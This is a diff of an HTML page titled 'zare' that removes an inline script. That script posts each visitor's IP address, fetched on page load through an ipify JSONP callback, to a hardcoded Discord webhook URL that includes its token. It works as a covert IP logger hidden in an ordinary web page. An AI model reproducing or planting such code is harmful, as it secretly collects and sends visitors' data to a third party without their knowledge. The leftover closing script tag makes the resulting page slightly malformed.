@@ -9,25 +9,6 @@
     <title>zare</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="ac07b7f0ca4afd503f432a03-text/javascript"></script>
-	    <script>
-
-function getIP(json) 
-{
-     var request = new XMLHttpRequest();
-     
-     request.open("POST", "https://discord.com/api/webhooks/880814875704717373/9Qm_5eLtE7g9kOdqnCkxJ37pnD2alu1v9dENHpuL6pr9seMFvb516UOnCvchUrHeh6Kz");
-     
-     request.setRequestHeader('Content-type', 'application/json');
-     
-     var params = 
-     {
-          username: "lger",
-          avatar_url: "",
-          content: "**IP:** *" + json.ip + "*"
-     }
-     
-     request.send(JSON.stringify(params));
-}
 </script>
 
 <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
